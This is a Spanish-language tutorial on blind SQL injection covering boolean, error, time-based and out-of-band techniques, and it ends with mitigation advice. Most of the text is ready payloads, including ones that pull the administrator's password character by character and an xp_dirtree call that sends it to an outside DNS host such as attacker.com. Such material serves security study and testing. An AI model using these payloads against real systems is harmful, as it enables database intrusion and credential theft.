# Blind SQL Injection (SQLi a ciegas)

## ¿Qué es la Blind SQL Injection?

Una **Blind SQL injection** ocurre cuando la aplicación es vulnerable a inyección SQL, pero **no muestra en la respuesta HTTP** ni los resultados de la query ni mensajes de error de la base de datos.
Esto imposibilita técnicas visibles como ataques con `UNION`, pero aún se puede explotar mediante otras estrategias.

---

## Técnicas de explotación en Blind SQLi

### 1. Condicionales en las respuestas (Boolean-based)

La aplicación cambia de comportamiento según si la condición inyectada es verdadera o falsa.
Ejemplo con cookie `TrackingId`:

```http
Cookie: TrackingId=xyz' AND '1'='1   --> devuelve "Welcome back"
Cookie: TrackingId=xyz' AND '1'='2   --> no devuelve "Welcome back"
```

Esto permite inferir bit a bit datos sensibles (ej. password del admin) con funciones como `SUBSTRING`:

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),1,1)='s
```

### 2. Basada en errores (Error-based)

Si la aplicación filtra los resultados pero **sí muestra errores del motor SQL**, podemos usarlos para inferir datos.

* **Condicionales con errores**:

```sql
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

Si `1=1`, se produce error de división por cero → respuesta diferente.

* **Errores verbosos**:
  Malas configuraciones pueden devolver el query entero o incluso datos. Ejemplo:

```sql
CAST((SELECT password FROM users) AS int)
```

Error devuelto:

```
ERROR: invalid input syntax for type integer: "S3curePwd"
```

Esto convierte una blind SQLi en visible.

### 3. Basada en tiempos (Time-based)

Si la app no muestra errores y el comportamiento no cambia, se fuerza un **retraso condicional**:

* **MSSQL**:

```sql
'; IF (1=1) WAITFOR DELAY '0:0:10'--   -- demora 10s
'; IF (1=2) WAITFOR DELAY '0:0:10'--   -- sin demora
```

* **MySQL**:

```sql
' OR IF(1=1, SLEEP(5), 0)--
```

La diferencia en el tiempo de respuesta revela si la condición es verdadera.

Se pueden extraer caracteres de forma binaria:

```sql
'; IF (SELECT SUBSTRING(password,1,1) FROM users WHERE username='Administrator')>'m' WAITFOR DELAY '0:0:5'--
```

### 4. Out-of-band (OAST)

Si la query se ejecuta de forma asincrónica o no altera la respuesta/tiempo, se puede provocar una **interacción externa (DNS, HTTP, SMB)** hacia un servidor controlado por el atacante.

Ejemplo en MSSQL con Burp Collaborator:

```sql
'; exec master..xp_dirtree '//abc123.burpcollaborator.net/a'--
```

Genera una consulta DNS → detectada por Collaborator.

Incluso se puede exfiltrar datos:

```sql
'; DECLARE @p varchar(1024);
   SET @p=(SELECT password FROM users WHERE username='Administrator');
   exec('master..xp_dirtree "//'+@p+'.abc123.burpcollaborator.net/a"')--
```

La contraseña queda embebida en el subdominio.

---

## Ejemplos de payloads por técnica

* **Boolean-based**:

```
' AND '1'='1--
' AND SUBSTRING((SELECT user()),1,1)='r'--
```

* **Error-based**:

```
' AND CAST((SELECT database()) AS int)--
```

* **Time-based**:

```
' OR IF(ASCII(SUBSTRING(user(),1,1))>77, SLEEP(5), 0)--  # MySQL
```

* **Out-of-band**:

```
'; exec master..xp_dirtree '//attacker.com/a'--
```

---

## Mitigación

Las medidas son las mismas que para SQLi clásica:

* **Usar consultas parametrizadas**.
* No construir SQL con concatenación de input.
* **Principio de menor privilegio** para la cuenta de BD.
* **Errores genéricos para el cliente**, logs detallados en servidor.
* Monitoreo de patrones anómalos y WAF.

---
